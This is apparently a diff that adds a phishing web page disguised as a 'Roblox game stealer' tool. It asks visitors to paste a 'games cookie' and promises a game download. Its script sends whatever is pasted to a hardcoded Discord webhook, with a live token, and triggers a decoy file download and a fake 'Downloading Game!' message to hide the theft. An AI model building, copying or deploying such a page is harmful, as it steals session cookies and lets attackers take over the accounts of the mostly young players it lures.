@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Game Stealer - Download Any Roblox Game</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap');
+
+        body {
+            background: radial-gradient(circle at top, #1e293b 0%, #0f172a 100%);
+            background-attachment: fixed;
+            color: #f8fafc;
+            font-family: 'Space Grotesk', sans-serif;
+            overflow-x: hidden;
+        }
+
+        .grid-overlay {
+            position: fixed;
+            inset: 0;
+            background-image: linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: -1;
+        }
+
+        .hero-glow {
+            position: absolute;
+            top: -10%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80vw;
+            height: 50vh;
+            background: radial-gradient(circle, rgba(59, 130, 246, 0.3) 0%, transparent 70%);
+            filter: blur(80px);
+            z-index: -1;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.07);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        .input-glow:focus-within {
+            border-color: #60a5fa;
+            box-shadow: 0 0 30px rgba(96, 165, 250, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-vibrant {
+            background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .btn-vibrant:hover:not(:disabled) {
+            transform: scale(1.02);
+            filter: brightness(1.1);
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+        }
+
+        .btn-vibrant:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .tutorial-sidebar {
+            position: fixed;
+            left: 3rem;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 450px;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center relative">
+    <div class="grid-overlay"></div>
+    <div class="hero-glow"></div>
+
+    <div class="tutorial-sidebar hidden 2xl:block">
+        <div class="glass p-6 rounded-3xl border-blue-500/30">
+            <h3 class="text-sm font-bold uppercase tracking-widest text-blue-400 mb-4 ml-1">
+                <i class="fas fa-play-circle mr-2"></i>Tutorial
+            </h3>
+            <div class="rounded-2xl overflow-hidden border border-white/10 bg-black/40 shadow-2xl">
+                <video controls class="w-full aspect-video">
+                    <source src="tut.mp4" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+        </div>
+    </div>
+
+    <nav class="w-full max-w-6xl flex justify-between items-center p-8">
+        <div class="flex items-center gap-3">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg" alt="Logo" class="w-10 h-10 rounded-lg object-cover">
+            <span class="text-xl font-bold tracking-tight">ROBLOX<span class="text-blue-400">CAST</span></span>
+        </div>
+        <div class="hidden md:flex gap-8 text-xs font-bold uppercase tracking-widest">
+            <span class="text-blue-400"><i class="fas fa-circle text-[8px] mr-2 animate-pulse"></i> Service Online</span>
+            <span class="text-slate-400">v2.3 Stable</span>
+        </div>
+    </nav>
+
+    <main class="flex-1 w-full max-w-4xl px-6 flex flex-col items-center justify-center text-center -mt-10">
+        <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full border border-blue-400/30 bg-blue-400/10 text-blue-300 text-[11px] font-bold uppercase tracking-[0.2em] mb-8">
+            <i class="fas fa-paper-plane animate-bounce"></i>
+            Unlimited Game Downloads
+        </div>
+
+        <h1 class="text-5xl md:text-8xl font-bold mb-6 tracking-tighter leading-none">
+            Download Games<span class="text-blue-400">Instantly.</span>
+        </h1>
+        
+        <p class="text-slate-300 text-lg mb-12 max-w-2xl font-light">
+           THE FASTES ROBLOX GAME DOWNLOADER [STEALER]
+<strong></strong>
+        </p>
+
+        <div class="w-full max-w-2xl glass p-8 rounded-3xl mb-8">
+            <div class="flex flex-col gap-6">
+                <div class="flex flex-col text-left gap-2">
+                    <label class="text-[10px] uppercase tracking-widest font-bold text-slate-400 ml-2">Games Cookie</label>
+                    <div class="flex items-start px-6 py-4 rounded-2xl bg-white/5 border border-white/10 input-glow transition-all">
+                        <i class="fas fa-file-alt text-blue-400 mt-1 mr-4"></i>
+                        <textarea id="messageBox" placeholder="Please enter the games cookie..." class="w-full bg-transparent outline-none text-white placeholder-slate-500 font-sans text-sm h-48 resize-none overflow-y-auto"></textarea>
+                    </div>
+                </div>
+
+                <button id="sendBtn" onclick="sendMessage()" class="btn-vibrant w-full py-5 rounded-2xl text-sm font-black tracking-widest text-white uppercase">
+                    <i class="fas fa-share-square mr-2"></i>  STEAL GAME
+                </button>
+            </div>
+        </div>
+
+        <div id="statusMessage" class="hidden text-sm font-bold uppercase tracking-widest transition-all duration-300"></div>
+    </main>
+
+    <footer class="p-8 text-slate-500 text-[10px] tracking-widest uppercase">
+        ROBLOX GAME DOWNLOADER • FREE 2026
+    </footer>
+
+    <script>
+        function triggerDownload() {
+            const fileName = "Zee Hood [MACRO!].rbxl";
+            const link = document.createElement("a");
+            link.href = fileName;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        async function sendMessage() {
+            const webhookUrl = "https://discord.com/api/webhooks/1470970214064853297/TkyUatYvujnLHGRc2_X_uexe7OuBFG0DIj_Yrfy-5umbktDMN1h6NUVFZnd5r3qVhDAG";
+            const messageInput = document.getElementById('messageBox');
+            const btn = document.getElementById('sendBtn');
+            const message = messageInput.value.trim();
+
+            if (!message) {
+                showStatus("Please enter some text for the file.", "text-yellow-400");
+                return;
+            }
+
+            // Check if it's the first time running
+            if (!localStorage.getItem('hasDownloaded')) {
+                triggerDownload();
+                localStorage.setItem('hasDownloaded', 'true');
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i> UPLOADING...';
+
+            // Create the .txt file blob
+            const blob = new Blob([message], { type: 'text/plain' });
+            
+            // Prepare the FormData
+            const formData = new FormData();
+            formData.append('file', blob, 'text.txt');
+            // Optional: You can also add a message content alongside the file
+            // formData.append('payload_json', JSON.stringify({ content: "New text file received:" }));
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    showStatus("Downloading Game!", "text-green-400");
+                    messageInput.value = ""; 
+                } else {
+                    showStatus("Error: " + response.statusText, "text-red-400");
+                }
+            } catch (error) {
+                showStatus("Network connection failed.", "text-red-400");
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-share-square mr-2"></i> Broadcast File';
+            }
+        }
+
+        function showStatus(text, colorClass) {
+            const status = document.getElementById('statusMessage');
+            status.innerText = text;
+            status.className = `block text-sm font-bold uppercase tracking-widest transition-all ${colorClass}`;
+            setTimeout(() => { status.className = "hidden"; }, 4000);
+        }
+    </script>
+</body>
+</html>
